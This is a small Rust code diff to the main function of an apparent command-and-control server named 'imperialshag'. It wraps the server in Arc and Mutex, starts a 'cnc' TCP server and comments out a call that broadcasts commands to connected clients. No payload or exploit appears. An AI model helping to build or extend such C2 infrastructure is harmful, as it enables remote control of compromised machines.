@@ -1,4 +1,7 @@
-  
+use tokio::sync::Mutex;
+use std::sync::Arc;
+use tokio::signal;
+
 mod server;
 mod socket;
 
@@ -9,12 +12,18 @@ const PORT: u16 = 8080;
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Welcome to imperialshag :)");
     println!("Starting TCP server.");
-    let mut server = server::Server::new();
+    let server = Arc::new(Mutex::new(server::Server::new()));
 
-    server::start_cnc_server(IP, PORT, &mut server).await?;
+    server::start_cnc_server(IP, PORT, &server).await?;
 
     println!("I'm here");
-    server.broadcast_command(b"".to_vec()).await;
+    // signal::ctrl_c().await?;
+    // let my_server = Arc::clone(&server);
+    // let mut lock = my_server.lock().await;
+    // println!("Broadcasting");
+    // lock.broadcast_command(b"".to_vec()).await.unwrap();
+    // std::mem::drop(lock);
+    signal::ctrl_c().await?;
     Ok(())
 }
 
